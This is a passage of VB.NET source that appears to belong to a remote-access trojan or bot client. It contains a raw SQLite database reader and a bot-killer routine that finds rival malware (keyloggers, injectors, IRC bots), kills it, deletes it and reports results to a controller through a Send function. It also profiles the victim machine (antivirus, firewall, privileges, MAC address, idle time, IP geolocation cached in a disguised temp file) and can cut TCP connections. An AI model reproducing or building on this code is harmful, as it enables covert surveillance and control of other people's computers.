        Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(", StringComparison.Ordinal) + 1).Split(",")
        For i = 0 To fields.Length - 1 Step 1
            fields(i) = LTrim(fields(i))
            Dim index = fields(i).IndexOf(" ", StringComparison.Ordinal)
            If index > 0 Then fields(i) = fields(i).Substring(0, index)
            If fields(i).IndexOf("UNIQUE", StringComparison.Ordinal) = 0 Then
                Exit For
            Else
                ReDim Preserve field_names(i)
                field_names(i) = fields(i)
            End If
        Next
        Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
    End Function

    Public Function GetRowCount() As Integer
        On Error Resume Next
        Return table_entries.Length
    End Function
    Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
        On Error Resume Next
        If row_num >= table_entries.Length Then Return Nothing
        If field >= table_entries(row_num).content.Length Then Return Nothing
        Return table_entries(row_num).content(field)
    End Function
    Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
        On Error Resume Next
        Dim found As Integer = -1
        For i = 0 To field_names.Length Step 1
            If String.Compare(field_names(i).ToLower(), field.ToLower(), StringComparison.Ordinal) = 0 Then
                found = i
                Exit For
            End If
        Next
        If found = -1 Then Return Nothing
        Return GetValue(row_num, found)
    End Function

    Public Function GetTableNames() As String()
        On Error Resume Next
        Dim retVal As String() = Nothing
        Dim arr = 0
        For i = 0 To master_table_entries.Length - 1 Step 1
            If master_table_entries(i).item_type = "table" Then
                ReDim Preserve retVal(arr)
                retVal(arr) = master_table_entries(i).item_name
                arr = arr + 1
            End If
        Next
        Return retVal
    End Function

    Public Sub New(ByVal baseName As String)
        On Error Resume Next
        If File.Exists(baseName) Then
            FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            Dim asi As String = Space(LOF(1))
            FileGet(1, asi)
            FileClose(1)
            db_bytes = System.Text.Encoding.Default.GetBytes(asi)
            If String.Compare(System.Text.Encoding.Default.GetString(db_bytes, 0, 15), "SQLite format 3", StringComparison.Ordinal) <> 0 Then
                End
            End If
            If db_bytes(52) <> 0 Then
                End
            ElseIf ConvertToInteger(44, 4) >= 4 Then
                End
            End If
            page_size = ConvertToInteger(16, 2)
            encoding = ConvertToInteger(56, 4)
            If encoding = 0 Then encoding = 1
            ReadMasterTable(100)
        End If
    End Sub

End Class
#End Region

#End Region

#Region " Removal "

#Region "Imports"

#End Region

Class Removal

#Region "Declarations"
    Private Declare Function MoveFileEx Lib "kernel32" Alias "MoveFileExA" (ByVal OldFilename As String, ByVal NewFileName As String, ByVal nWord As Long) As Long
    Public AppLocal As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
    Public Temp As String = Environment.GetEnvironmentVariable("temp")
    Public DirStartup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
    Public DirStartup2 As String = Environment.GetEnvironmentVariable("SystemDrive") & "\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    Public AppData As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public Users As String = Environment.GetEnvironmentVariable("userprofile")
#End Region

    Private Strings1() As String = {"SetWindowsHookEx", "GetForegroundWindow", "GetWindowText"}
    Private Strings2() As String = {"GetAsyncKeyState", "GetForegroundWindow", "GetWindowText"}
    Private Strings3() As String = {"SetThreadContext", "ZwUnmapViewOfSection", "VirtualAllocEx"}
    Private Strings4() As String = {"PRIVMSG", "JOIN", "USER", "NICK"}
    Private Strings5() As String = {"WSAStartup", "gethostbyname", "gethostbyaddr", "gethostname", "bs_fusion_bot", "MAP_GETCOUNTRY", "VS_VERSION_INFO", "LookupAccountNameA", "CryptUnprotectData", "Blackshades NET"}
    Private Strings6() As String = {"MD5CryptoServiceProvider", "RijndaelManaged"}
    Private Strings7() As String = {"GetExecutingAssembly", "System.Reflection"}

    Private Const RemovalStatusHeader = 125

    Private ListOfObjects As New List(Of PossibleThreat)

    Public Structure PossibleThreat
        Dim FullPath As String
        Dim Running As Boolean
        Dim ID As Integer
        Dim Judged As JudgedAs
        Dim RegKey As String
        Dim ExeName As String
    End Structure

    Public Enum RemovalStatus
        AttemptingRemoval = 1
        ProcessTerminated = 2
        RemovedFile = 4
        RegistryKeyRemoved = 5
        FailedToRemove = 6
        RemovingOnReboot = 7
        ThreatRemoved = 8
    End Enum

    Public Enum JudgedAs
        Unknown = 17
        Keylogger = 18
        GenericBot = 19
        Injector = 20
        IRC_bot = 21
        NET_Injector = 22
        NET_ExecuteBytes = 23
    End Enum

#Region "Scanning"
    Public Sub ScanThread()
        On Error Resume Next
        Dim ExternalScan As New Thread(AddressOf ScanBots)
        ExternalScan.SetApartmentState(ApartmentState.STA)
        ExternalScan.Start()
        GC.Collect()
    End Sub

    Public Sub ScanBots()
        Try
            ListOfObjects.Clear()
            Dim SuspicionList As New List(Of String)
            For Each S As String In ReturnHKCUStrs("Software\Microsoft\Windows\CurrentVersion\Run")
                SuspicionList.Add(S)
            Next
            For Each S As String In ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\Run")
                SuspicionList.Add(S)
            Next
            For Each S As String In ReturnHKCUStrs("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                SuspicionList.Add(S)
            Next
            For Each S As String In ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                SuspicionList.Add(S)
            Next
            For Each S As String In ReturnDirStrs(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                SuspicionList.Add(S)
            Next
            For Each S As String In ReturnDirStrs(Environment.GetEnvironmentVariable("SystemDrive") & "\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
                SuspicionList.Add(S)
            Next
            For Each FilePath As String In SuspicionList
                Try
                    If IsFilePathAlright(FilePath.Split(MainModule.SplitMark1)(0)) Then ListOfObjects.Add(ScanFile(FilePath))
                Catch : End Try
            Next
            Dim SendingString As String = Nothing
            For x = 0 To ListOfObjects.Count - 1
                If Not ListOfObjects(x).FullPath = Nothing And Not ListOfObjects(x).Judged = Nothing Then
                    SendingString &= ListOfObjects(x).ID & MainModule.SplitMark1
                    SendingString &= ListOfObjects(x).FullPath & MainModule.SplitMark1
                    SendingString &= ListOfObjects(x).RegKey & MainModule.SplitMark1

                    If ListOfObjects(x).Running Then
                        SendingString &= Chr(2) & MainModule.SplitMark1
                    Else
                        SendingString &= Chr(1) & MainModule.SplitMark1
                    End If
                    SendingString &= Chr(x + 8) & MainModule.SplitMark1
                    SendingString &= Chr(ListOfObjects(x).Judged) & MainModule.splitMark2
                End If
            Next
            If Not SendingString = Nothing Then
                MainModule.Send(Chr(MainModule.CommandType.MalwareRemoval) & SendingString)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Function IsFilePathAlright(ByVal path As String) As Boolean
        If path.Contains(Users) Then Return True
        Return False
    End Function

    Public Function ScanFile(ByVal path As String) As PossibleThreat
        Try
            If IO.File.Exists(path.Split(MainModule.SplitMark1)(0)) Then
                Dim Info As New PossibleThreat
                Info.FullPath = path.Split(MainModule.SplitMark1)(0)
                Info.RegKey = path.Split(MainModule.SplitMark1)(1)
                Info.Running = IsProcessRunning(path)
                Info.ExeName = System.IO.Path.GetFileName(Info.FullPath)
                Dim TempString As String = System.Text.Encoding.UTF8.GetString(IO.File.ReadAllBytes(Info.FullPath)).Trim(Chr(0))
                If Not TempString = Nothing Then
                    If TempString.Contains(Strings5(0)) Or TempString.Contains(Strings5(1)) Or TempString.Contains(Strings5(2)) Or TempString.Contains(Strings5(3)) Then
                        Info.Judged = JudgedAs.GenericBot
                    ElseIf TempString.Contains(Strings1(0)) Or TempString.Contains(Strings1(1)) Or TempString.Contains(Strings1(2)) Then
                        Info.Judged = JudgedAs.Keylogger
                    ElseIf TempString.Contains(Strings2(0)) Or TempString.Contains(Strings2(1)) Or TempString.Contains(Strings2(2)) Then
                        Info.Judged = JudgedAs.Keylogger
                    ElseIf TempString.Contains(Strings3(0)) Or TempString.Contains(Strings3(1)) Or TempString.Contains(Strings3(2)) Then
                        Info.Judged = JudgedAs.Injector
                    ElseIf TempString.Contains(Strings4(0)) Or (TempString.Contains(Strings4(1)) And TempString.Contains(Strings4(2)) And TempString.Contains(Strings4(3))) Then
                        Info.Judged = JudgedAs.IRC_bot
                    ElseIf TempString.Contains(Strings6(0)) Or TempString.Contains(Strings6(1)) Then
                        Info.Judged = JudgedAs.NET_Injector
                    ElseIf TempString.Contains(Strings7(0)) Or TempString.Contains(Strings7(1)) Then
                        Info.Judged = JudgedAs.NET_ExecuteBytes
                    Else
                        Info.Judged = JudgedAs.Unknown
                    End If
                    Return Info
                Else
                    Return Nothing
                End If
            End If
            Return Nothing
        Catch ex As Exception
            Return Nothing
        End Try

    End Function

    Public Function ReturnHKCUStrs(ByVal key As String) As List(Of String)
        On Error Resume Next
        Dim StringsToRet As New List(Of String)
        For Each R1 In My.Computer.Registry.CurrentUser.OpenSubKey(key, False).GetValueNames
            Dim rVal As String = My.Computer.Registry.CurrentUser.OpenSubKey(key, False).GetValue(R1)
            If rVal.Contains(Chr(34)) Then
                rVal = rVal.Split(Chr(34))(1)
            End If
            If rVal.Contains(" -") Then
                rVal = Split(rVal, " -")(0)
            End If
            If rVal.Contains(" /") Then
                rVal = Split(rVal, " /")(0)
            End If
            If rVal.Contains(".exe") Or rVal.Contains(".dll") Or rVal.Contains(".bat") Or rVal.Contains(".vbs") Or rVal.Contains(".scr") Then StringsToRet.Add(rVal & MainModule.SplitMark1 & "HKEY_CURRENT_USER\" & key & "\" & R1)
        Next
        Return StringsToRet
    End Function

    Public Function ReturnHKLMStrs(ByVal key As String) As List(Of String)
        On Error Resume Next
        Dim StringsToRet As New List(Of String)
        For Each R1 In My.Computer.Registry.LocalMachine.OpenSubKey(key, False).GetValueNames
            Dim rVal As String = My.Computer.Registry.LocalMachine.OpenSubKey(key, False).GetValue(R1)
            If rVal.Contains(Chr(34)) Then
                rVal = rVal.Split(Chr(34))(1)
            End If
            If rVal.Contains(" -") Then
                rVal = Split(rVal, " -")(0)
            End If
            If rVal.Contains(" /") Then
                rVal = Split(rVal, " /")(0)
            End If
            If rVal.Contains(".exe") Or rVal.Contains(".dll") Or rVal.Contains(".bat") Or rVal.Contains(".vbs") Or rVal.Contains(".scr") Then StringsToRet.Add(rVal & MainModule.SplitMark1 & "HKEY_LOCAL_MACHINE\" & key & "\" & R1)
        Next
        Return StringsToRet
    End Function

    Public Function ReturnDirStrs(ByVal path As String) As List(Of String)
        On Error Resume Next
        Dim StringsToRet As New List(Of String)
        For Each f As IO.FileInfo In New IO.DirectoryInfo(path).GetFiles
            If f.FullName.Contains(".exe") Or f.FullName.Contains(".dll") Or f.FullName.Contains(".bat") Or f.FullName.Contains(".vbs") Or f.FullName.Contains(".scr") Then StringsToRet.Add(f.FullName & MainModule.SplitMark1 & f.FullName)
        Next
        Return StringsToRet
    End Function

    'Public Function ProcessListing() As List(Of Process)
    '    Dim SuspiciousList As New List(Of Process)
    '    For Each p As Process In Process.GetProcesses
    '        Try
    '            Dim MainModLoc As String = p.MainModule.FileName
    '            If MainModLoc.Contains(Users) Then
    '                SuspiciousList.Add(p)
    '            End If
    '        Catch
    '        End Try
    '    Next
    '    Return SuspiciousList
    'End Function
#End Region

#Region "Processes"
    Public Function IsProcessRunning(ByVal fullpath As String) As Boolean

        For Each p As Process In Process.GetProcesses
            Try
                If p.MainModule.FileName = fullpath Then
                    Return True
                End If
            Catch
            End Try
        Next
        Return False
    End Function
#End Region

#Region "Actions"
    Public Sub StartRemoval(ByVal RemovalData As Object)
        Try
            Dim RemoveReboot As Boolean = False
            If RemovalData.Split(SplitMark1)(0) = Chr(2) Then
                RemoveReboot = True
            Else
                RemoveReboot = False
            End If
            For x = 1 To RemovalData.Split(SplitMark1).Length - 1
                RemoveThreat(Asc(RemovalData.Split(SplitMark1)(x)) - 8, RemoveReboot)
            Next

        Catch ex As Exception

        End Try
    End Sub

    Public Function RemoveThreat(ByVal ListId As Integer, ByVal DelOnReboot As Boolean) As Boolean
        Try

            For Each p As Process In Process.GetProcesses
                Try
                    If p.MainModule.FileName = ListOfObjects(ListId).FullPath Then
                        p.Kill()
                        Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.ProcessTerminated))
                        Thread.Sleep(1000)
                    End If
                Catch : End Try
            Next
            Try
                File.Delete(ListOfObjects(ListId).FullPath)
                Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.RemovedFile))
            Catch : End Try
            Thread.Sleep(1000)
            If Not ListOfObjects(ListId).RegKey = Nothing Then
                Try
                    Select Case ListOfObjects(ListId).RegKey.Split("\")(0)
                        Case "HKEY_CURRENT_USER"
                            My.Computer.Registry.CurrentUser.DeleteValue(ListOfObjects(ListId).RegKey.Remove(0, ListOfObjects(ListId).RegKey.IndexOf("\", StringComparison.Ordinal) + 1), False)
                        Case "HKEY_LOCAL_MACHINE"
                            My.Computer.Registry.CurrentUser.DeleteValue(ListOfObjects(ListId).RegKey.Remove(0, ListOfObjects(ListId).RegKey.IndexOf("\", StringComparison.Ordinal) + 1), False)
                    End Select
                    Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.RegistryKeyRemoved))
                Catch

                End Try
            End If
            Thread.Sleep(1000)
            Try
                If File.Exists(ListOfObjects(ListId).FullPath) Then
                    If SystemInformation.Privileges = SystemInformation.UserPrivileges.Admin And DelOnReboot Then
                        Dim RemoveRebootSuccess As Integer = DeleteFileOnReboot(ListOfObjects(ListId).FullPath)
                        If RemoveRebootSuccess Then
                            Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.RemovingOnReboot))
                            Return True
                        Else
                            Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.FailedToRemove))
                            Return False
                        End If
                    End If
                    Return False
                End If
                Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.ThreatRemoved))
                Return True
            Catch
                If File.Exists(ListOfObjects(ListId).FullPath) Then
                    If SystemInformation.Privileges = SystemInformation.UserPrivileges.Admin And DelOnReboot Then
                        Dim RemoveRebootSuccess As Integer = DeleteFileOnReboot(ListOfObjects(ListId).FullPath)
                        If RemoveRebootSuccess Then
                            Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.RemovingOnReboot))
                            Return True
                        Else
                            Send(Chr(RemovalStatusHeader) & Chr(ListId + 8) & Chr(RemovalStatus.RemovingOnReboot))
                            Return True
                        End If
                    End If
                End If
                Return False
            End Try
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function DeleteFileOnReboot(ByVal FilePath As String) As Boolean
        Try
            Return MoveFileEx(FilePath, 0, 4)
        Catch
            Return False
        End Try
    End Function
#End Region

End Class

#End Region

#Region " System Information "


Public Class SystemInformation

    Public Enum UserPrivileges
        Admin = &H1
        User = &H2
        Guest = &H3
        Unknown = &H4
    End Enum


#Region "Get computer LAN address"
    Public Shared Function LAN() As String
        Try
            Dim IPHost As IPHostEntry = Dns.GetHostByName(Dns.GetHostName())
            Return IPHost.AddressList(0).ToString()
        Catch
            Return "?"
        End Try
    End Function
#End Region

#Region "Get firewall name"
    Public Shared Function Firewall() As String
        Try
            Dim FWCollection As Object
            Dim FW As Object
            Dim objWMIService As Object
            objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\SecurityCenter")
            FWCollection = objWMIService.ExecQuery("SELECT * FROM FirewallProduct")
            For Each FW In FWCollection
                Return FW.displayname
            Next
        Catch
            Try
                Dim FWCollection As Object
                Dim FW As Object
                Dim objWMIService As Object
                objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\SecurityCenter2")
                FWCollection = objWMIService.ExecQuery("SELECT * FROM FirewallProduct")
                For Each FW In FWCollection
                    Return FW.displayname
                Next
            Catch
                Return "Couldn't get FW!"
            End Try
            Return "Not Available"
        End Try
        Return "Not Available"
    End Function
#End Region

#Region "Get antivirus name"
    Public Shared Function Antivirus() As String
        Try
            Dim AVCollection As Object
            Dim AV As Object
            Dim objWMIService As Object
            objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\SecurityCenter2")
            AVCollection = objWMIService.ExecQuery("Select * from AntiVirusProduct")
            For Each AV In AVCollection
                Return AV.displayname
            Next
            Dim AVCollection1 As Object
            Dim AV1 As Object
            Dim objWMIService1 As Object
            objWMIService1 = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\SecurityCenter")
            AVCollection1 = objWMIService.ExecQuery("Select * from AntiVirusProduct")
            For Each AV1 In AVCollection
                Return AV1.displayname
            Next
            Return "Not Available"
        Catch
            Try
                Dim AVCollection As Object
                Dim AV As Object
                Dim objWMIService As Object
                objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\SecurityCenter")
                AVCollection = objWMIService.ExecQuery("Select * from AntiVirusProduct")
                For Each AV In AVCollection
                    Return AV.displayname
                Next
            Catch
                Return "Couldn't get AV!"
            End Try

            Return "Not Available"
        End Try
    End Function

#End Region

#Region "Operating system"
    Shared Function OS() As String
        On Error Resume Next
        Dim OSstring As String = My.Computer.Info.OSFullName

        Return My.Computer.Info.OSFullName.Replace("Microsoft ", "")
    End Function
#End Region

#Region "Get current username"
    Shared Function Username() As String
        Try
            Return Environment.UserName
        Catch
            Return "?"
        End Try
    End Function
#End Region

#Region "Get current computer name"
    Shared Function ComputerName() As String
        Try
            Return Environment.MachineName
        Catch
            Return "?"
        End Try
    End Function
#End Region

#Region "Get current user privileges"

    Public Shared Function Privileges() As UserPrivileges
        Try
            Dim identity As WindowsIdentity = WindowsIdentity.GetCurrent()
            Dim principal As WindowsPrincipal = New WindowsPrincipal(identity)
            If principal.IsInRole(WindowsBuiltInRole.Administrator) Then
                Return UserPrivileges.Admin
            ElseIf principal.IsInRole(WindowsBuiltInRole.Guest) Then
                Return UserPrivileges.Guest
            ElseIf principal.IsInRole(WindowsBuiltInRole.User) Then
                Return UserPrivileges.User
            End If
            Return UserPrivileges.Unknown
        Catch
            Return UserPrivileges.Unknown
        End Try
    End Function
#End Region

#Region "Get country name"
    <DllImport("kernel32.dll")> _
    Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal StrBuilder As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
    Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002
    Private Shared Function GetInfo(ByVal lInfo As UInteger) As String
        On Error Resume Next
        Dim StrBuilder As StringBuilder = New System.Text.StringBuilder(256)
        Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, StrBuilder, StrBuilder.Capacity)
        If ret > 0 Then
            Return StrBuilder.ToString().Substring(0, ret - 1)
        End If
        Return String.Empty
    End Function
    Shared Function Country() As String
        Try
            Dim MyCountry As String = (GetInfo(LOCALE_SENGCOUNTRY))
            Return MyCountry
        Catch ex As Exception
            Return "Unknown country"
        End Try
    End Function
#End Region

#Region "GetScreens"
    Public Shared Function Screens() As Integer
        On Error Resume Next
        Dim numberofmonitors As Integer = Screen.AllScreens.Length
        Return numberofmonitors
    End Function
#End Region

#Region "GetProcessor"
    Public Shared Function GetProcessorId() As String
        Try
            Dim wmi As Object = GetObject("winmgmts:")
            For Each CPU In wmi.InstancesOf("Win32_Processor")
                Return CPU.Name
            Next
            Return "(unknown processor)"
        Catch
            Return "(Error finding processor)"
        End Try
    End Function
#End Region

#Region "GetGFX"
    Public Shared Function GetGraphicsCardName() As String
        Dim GraphicsCardName = String.Empty
        Try
            Dim WmiSelect As New ManagementObjectSearcher _
            ("root\CIMV2", "SELECT * FROM Win32_VideoController")
            For Each WmiResults As ManagementObject In WmiSelect.Get()
                GraphicsCardName = WmiResults.GetPropertyValue("Name").ToString
                If (Not String.IsNullOrEmpty(GraphicsCardName)) Then

                    Exit For
                End If
            Next
        Catch err As ManagementException
            Return "Graphics Card Not Found"
        End Try
        Return GraphicsCardName
    End Function
#End Region

#Region "Battery"
    Private Declare Auto Function GetSystemPowerStatus Lib "kernel32.dll" (ByRef lpSystemPowerStatus As SYSTEM_POWER_STATUS) As Integer

    Public Structure SYSTEM_POWER_STATUS
        Public ACLineStatus As ACLineStatus
        Public BatteryFlag As BatteryFlag
        Public BatteryLifePercent As Byte
        Public Reserved1 As Byte
        Public BatteryLifeTime As Integer
        Public BatteryFullLifeTime As Integer
    End Structure

    Public Enum BatteryFlag As Byte
        High = 1
        Low = 2
        Critical = 4
        Charging = 8
        NoSystemBattery = 128
        Unknown = 255
    End Enum

    Public Enum ACLineStatus As Byte
        Offline = 0
        Online = 1
        Unknown = 255
    End Enum

    Public Shared Function GetStatus() As SYSTEM_POWER_STATUS
        On Error Resume Next
        Dim SPS As New SYSTEM_POWER_STATUS
        GetSystemPowerStatus(SPS)
        Return SPS
    End Function
    Public Shared Function Battery() As String
        On Error Resume Next
        Dim Status As SYSTEM_POWER_STATUS = GetStatus()
        If Status.BatteryLifeTime.ToString = -1 And Status.BatteryFlag = BatteryFlag.NoSystemBattery Then
            Return "Desktop (No Battery)"
        Else
            Return "Laptop (" & Status.BatteryLifePercent.ToString & "%" & " Battery)"
        End If
    End Function
#End Region

#Region "MACAddress"
    Public Shared Function getMacAddress() As String
        On Error Resume Next
        Dim networkcard() As NetworkInterface = NetworkInterface.GetAllNetworkInterfaces()
        Dim netCard As String = networkcard(0).GetPhysicalAddress.ToString
        Return netCard
    End Function
#End Region

#Region "Idle time in seconds"

    <DllImport("user32.dll")> _
    Shared Function GetLastInputInfo(ByRef plii As LASTINPUTINFO) As Boolean
    End Function



    <StructLayout(LayoutKind.Sequential)> Structure LASTINPUTINFO
        <MarshalAs(UnmanagedType.U4)> Public cbSize As Integer
        <MarshalAs(UnmanagedType.U4)> Public dwTime As Integer
    End Structure

    Public Shared Function GetLastInputTime() As Integer
        On Error Resume Next
        Dim lastInputInf As New LASTINPUTINFO()
        lastInputInf.cbSize = Marshal.SizeOf(lastInputInf)

        If GetLastInputInfo(lastInputInf) Then
            Return Int((Environment.TickCount - lastInputInf.dwTime) / 1000)
        Else
            Return -1
        End If
    End Function
#End Region

#Region "IP"
    Public Structure LocationInfo
        Dim Longitude As Double
        Dim Latitude As Double
        Dim Country As String
        Dim City As String
        Dim State As String
        Dim ISP As String
        Dim Organization As String
    End Structure
    Public Const API = "http://freegeoip.net/json/"
    Public Const QUOTE = Chr(34)
    Public Shared Function GetIPLatLong() As LocationInfo
        Dim A As New LocationInfo
        Try
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\r58Ies.tmp") Then
                Dim Content() As String = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\r58Ies.tmp")
                A.Latitude = Double.Parse(Content(0).Split("/")(1), CultureInfo.InvariantCulture)
                A.Longitude = Double.Parse(Content(0).Split("/")(0), CultureInfo.InvariantCulture)
                A.Country = Content(1)
                A.City = Content(2)
                A.State = Content(3)
                Return A
            End If
            Dim Source As String = New WebClient().DownloadString(API)
            Dim Country As String = Source.Split(QUOTE)(11)
            Dim State As String = Source.Split(QUOTE)(19)
            Dim City As String = Source.Split(QUOTE)(23)
            Dim Latitude As String = Source.Split(QUOTE)(30).Split(":")(1).Split(",")(0)
            Dim Longitude As String = Source.Split(QUOTE)(32).Split(":")(1).Split(",")(0)
            A.Country = Country
            A.City = City
            A.State = State
            A.Latitude = Double.Parse(Longitude, CultureInfo.InvariantCulture)
            A.Longitude = Double.Parse(Latitude, CultureInfo.InvariantCulture)
            If Not File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\r58Ies.tmp") Then IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\r58Ies.tmp", A.Longitude & "/" & A.Latitude & Environment.NewLine & Country & Environment.NewLine & City & Environment.NewLine & State)
            Return A
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function GetBetween(ByVal Input As String, ByVal Str1 As String, ByVal Str2 As String, ByVal Index As Integer) As String
        On Error Resume Next
        Dim Temp As String = Regex.Split(Input, Str1)(Index + 1)
        Return Regex.Split(Temp, Str2)(0)
    End Function
#End Region

#Region "RAM And TimeSinceLastReboot"
    Public Shared Function GetRamUsage() As String
        On Error Resume Next
        Return CInt((My.Computer.Info.TotalPhysicalMemory - My.Computer.Info.AvailablePhysicalMemory) / My.Computer.Info.TotalPhysicalMemory * 100)
    End Function
    Public Shared Function TimeSinceLastReboot() As String
        On Error Resume Next
        Dim timeSinceLastRebootMinutes As Double = My.Computer.Clock.TickCount / 1000 / 60
        Return CInt(timeSinceLastRebootMinutes).ToString() & " minutes"
    End Function
#End Region

#Region "GetSubnet"
    Public Shared Function GetSubnet() As String
        On Error Resume Next
        Dim subnetMask As String = Nothing
        Dim mc As New ManagementClass("Win32_NetworkAdapterConfiguration")
        Dim nics As ManagementObjectCollection
        nics = mc.GetInstances()
        Dim nic As ManagementObject
        For Each nic In nics
            If nic("ipEnabled") = True Then
                Dim s As String
                For Each s In nic("IPSubnet")
                    subnetMask = String.Format(s, nic("Caption"))
                    Exit For
                Next
                Exit For
            End If
        Next
        Return subnetMask
    End Function
#End Region

End Class

#End Region

#Region " Connections Manager "

Public Class ConnectionsManager

#Region "Connections mgr Get/Block"
    Public Shared Function KillConnection(ByVal RemotehostAddress As String, ByVal RemotePort As String, ByVal LocalAddress As String, ByVal LocalPort As String) As String
        Try
            If Not IPAddress.TryParse(RemotehostAddress, Nothing) Then
                RemotehostAddress = Dns.GetHostAddresses(RemotehostAddress)(0).ToString
            End If
            Return KillConnectionSub(LocalAddress, LocalPort, RemotehostAddress, RemotePort)
        Catch
            Return False
        End Try
    End Function


    Public Shared Function KillConnectionSub(ByVal locIP As String, ByVal locPort As String, ByVal remIP As String, ByVal remPort As String) As Boolean
        Try
            Dim LocalAddress() As Byte = IPAddress.Parse(locIP).GetAddressBytes
            Dim RemoteAddress() As Byte = IPAddress.Parse(remIP).GetAddressBytes
            Dim TCP_row As New TcpInfo
            TCP_row.cnxLocAdr = BitConverter.ToInt32(LocalAddress, 0)
            TCP_row.cnxLocPort = htons(Integer.Parse(locPort))
            TCP_row.cnxRemAdr = BitConverter.ToInt32(RemoteAddress, 0)
            TCP_row.cnxRemPort = htons(Integer.Parse(remPort))
            TCP_row.cnxState = MIB_TCP_STATE_DELETE_TCB
            Dim TCP_Pointer As IntPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(TCP_row))
            Marshal.StructureToPtr(TCP_row, TCP_Pointer, False)
            Return SetTcpEntry(TCP_Pointer)
        Catch
            Return False
        End Try
    End Function
    Private Structure TcpInfo
        Public cnxState As Integer
        Public cnxLocAdr As Integer
        Public cnxLocPort As Integer
        Public cnxRemAdr As Integer
        Public cnxRemPort As Integer
    End Structure
    <DllImport("iphlpapi.dll")> Private Shared Function SetTcpEntry(ByVal pTcprow As IntPtr) As Integer
    End Function
    <DllImport("wsock32.dll")> Private Shared Function htons(ByVal netshort As Integer) As Integer
    End Function

    Public Structure MIB_TCPROW_OWNER_PID
        Dim dwState As Integer
        Dim dwLocalAddr As Integer
        Dim dwLocalPort As Integer
        Dim dwRemoteAddr As Integer
        Dim dwRemotePort As Integer
        Dim dwOwningPid As Integer
    End Structure
    Private Const MIB_TCP_STATE_CLOSED As Short = 1
    Private Const MIB_TCP_STATE_LISTEN As Short = 2
    Private Const MIB_TCP_STATE_SYN_SENT As Short = 3
    Private Const MIB_TCP_STATE_SYN_RCVD As Short = 4
    Private Const MIB_TCP_STATE_ESTAB As Short = 5
    Private Const MIB_TCP_STATE_FIN_WAIT1 As Short = 6
    Private Const MIB_TCP_STATE_FIN_WAIT2 As Short = 7
    Private Const MIB_TCP_STATE_CLOSE_WAIT As Short = 8
    Private Const MIB_TCP_STATE_CLOSING As Short = 9
    Private Const MIB_TCP_STATE_LAST_ACK As Short = 10
    Private Const MIB_TCP_STATE_TIME_WAIT As Short = 11
    Private Const MIB_TCP_STATE_DELETE_TCB As Short = 12
    Declare Function GetExtendedTcpTable Lib "IPHLPAPI.dll" (ByVal pTcpTable As IntPtr, ByRef dwTcpTableSize As Integer, ByVal bOrder As Boolean, ByVal ulAf As Integer, ByVal TCP_TABLE_CLASS As Integer, ByVal Reserved As Integer) As Integer
    Declare Function GetExtendedUdpTable Lib "IPHLPAPI.dll" (ByVal pUdpTable As IntPtr, ByRef dwUdpTableSize As Integer, ByVal ubOrder As Boolean, ByVal uulAf As Integer, ByVal UDP_TABLE_CLASS As Integer, ByVal uReserved As Integer) As Integer
    Public Shared Function GetExtendedTCPdata() As String
        On Error Resume Next
        Const AF_INET As Integer = 2
        Dim dwTcpTableSize As Integer
        Dim iNumberOfStructures As Integer
        Dim TcpRow As MIB_TCPROW_OWNER_PID
        Dim pStructPointer As IntPtr = IntPtr.Zero
        Dim cstring As String = Nothing
        GetExtendedTcpTable(pStructPointer, dwTcpTableSize, 1, AF_INET, 5, 0)
        pStructPointer = Marshal.AllocHGlobal(dwTcpTableSize)
        GetExtendedTcpTable(pStructPointer, dwTcpTableSize, 1, AF_INET, 5, 0)
        iNumberOfStructures = Math.Ceiling((dwTcpTableSize - 4) / Marshal.SizeOf(GetType(MIB_TCPROW_OWNER_PID)))
        For i = 0 To iNumberOfStructures - 1
            Dim bar As Long = pStructPointer.ToInt32() + 4 + (i * Marshal.SizeOf(GetType(MIB_TCPROW_OWNER_PID)))
            Dim pStructPointerTemp As IntPtr = New IntPtr(bar)
